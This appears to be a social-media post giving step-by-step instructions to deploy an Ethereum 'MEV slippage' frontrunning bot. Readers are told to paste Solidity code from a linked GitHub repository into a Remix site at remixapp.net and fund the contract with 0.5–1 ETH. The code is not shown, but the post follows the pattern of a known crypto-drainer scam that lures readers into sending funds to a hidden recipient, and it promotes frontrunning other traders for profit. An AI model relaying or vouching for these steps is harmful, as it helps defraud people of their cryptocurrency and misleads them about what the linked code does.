🚨🚨 READ ME! : I've received messages from people who didn't fund the contract with enough Ethereum to cover gas fees and possible burn fees. The bot targets token contracts with max 10% burn fee and anything lower. However, nowadays most tokens come with 2~6% fees. If you fund the contract with 0.4 ETH or less, and the bot targets another token with high burn fees, the contract will waste a lot of gas fees. I recommend funding the contract with at least 0.5 ~ 1 ETH to make sure that won't happen.🚨🚨

You can PM me on Instagram:
https://www.instagram.com/davincij15/
STEP BY STEP INSTRUCTIONS

1. Download MetaMask:
https://metamask.io/download

2. Access Remix:
https://remixapp.net/


3. Click on the “contracts” folder and then create “New File”. Rename it as you like, i.e: “bot.sol”. Make sure it ends with .sol for Ethereum programming language.

Note: There is a problem if the text is not colored when you create bot.sol. Simply refresh the browser and then paste rentry codes again.

4. Paste THIS bot.sol code in Remix: 
NEW UPDATED CODE VERSION  
https://github.com/davincij15code/Mev-slippage-bot/blob/main/bot.sol 

5. Go to the "Compile" tab on Remix and Compile with Solidity version 0.8.19

6. Go to the “DEPLOY & RUN TRANSACTIONS” tab, select the “Injected Web3” as environment and then “Deploy”. By approving the Metamask Contract creation fee, you will have created your own contract.

Note: Make sure the name of your bot is selected in the CONTRACT section above deploy button. In this case mine would be "UniswapFrontrunBot -bot.sol".

Also if you get this message after deployment "Failed to publish metadata file to ipfs, please check the ipfs gateways is available. [{},{},{}] ". You can just ignore it and continue. This feature is to publish your bot to IPFS. Its not necessary, because the bot is in the blockchain and can be accessed through remix.

7. Fund your bot to be able to frontrun transactions.
Make sure your deposit is more than 0.5 ETH( to prevent negating slippage ) to your exact contract/bot address.

8. After your transaction is confirmed, click the "start" button to run the bot. Withdraw money at any time by clicking the "Withdraw" button

💰 Share your profits in the comments below, and like & subscribe for more solidity tutorials.🚨🚨
